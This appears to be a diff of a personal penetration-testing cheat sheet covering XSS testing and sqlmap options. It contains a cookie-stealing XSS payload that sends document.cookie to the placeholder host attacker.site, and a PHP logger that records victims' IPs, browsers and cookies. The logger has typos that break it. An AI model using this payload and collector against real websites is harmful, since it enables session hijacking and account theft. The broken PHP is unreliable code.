@@ -102,21 +102,23 @@ Reflected XSS:  <URL>/search.php?find=<payload>
 
 Persistent XSS: payload will be stored in website, like an guestbook
 
+> Test for HTML Tags, if input gets sanitist
+> try any field (comment, search, login) ONCE BY ONCE
+> check Javascript Code <script>alert('XSS');</script>
+
 Cookie Stealing
-<script>(document.cookie)</script>
+<script>alert(document.cookie)</script>
 
 sending Cookie to Attacker:
-<script>
-var i = new Image();
-i.src = "http://attacker.site/log.php?q="+document.cookie;
-</script>
+<script>var i=new Image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie)</script>
 
-log.php Script:
+get.php Script:
 <?php
-$filename="/tmp/log.txt";
-$fp=fopen($filename, 'a');
-$cookie=$_GET['q'];
-fwrite($fp, $cookie);
+$ip = $_SERVER['REMOTE_ADDR'];
+$browser = $SERVER['HTTP_USER_AGENT'];
+fp = fopen('jar.txt', 'a');
+fwrite($fp, $ip.' '.$browser." \n");
+fwrite($fp, urldecode($_SERVER['QUERY_STRING']. " \n\n"));
 fclose($fp);
 ?>
 
@@ -182,7 +184,7 @@ sqlmap:
 /usr/share/sqlmap/doc/README.pdf
 > -u <URL>
 > -r <file to read>
-> --data=<data to POST>
+> --data=<data to POST>   // 'user=user&pass=pass' -p user
 > -p <parameter>
 > -dbs        // print out databases
 > -D <DatabaseName> // use Database
@@ -198,7 +200,6 @@ sqlmap:
 > --current-user
 > --banner
 > --users   // print out users
-
 > --current-db <database> -columns
 > -v3       // show payloads used
 > --technique=
@@ -211,10 +212,9 @@ sqlmap:
 > --method=
   > PUT, POST, GET
 > -p <Proxy, this can be Burp on 127.0.0.1:8080>
-
 > --cookie=
 > --user-agent=
-
+> --flush-session             // new queries
 
 https://hack.me/
 
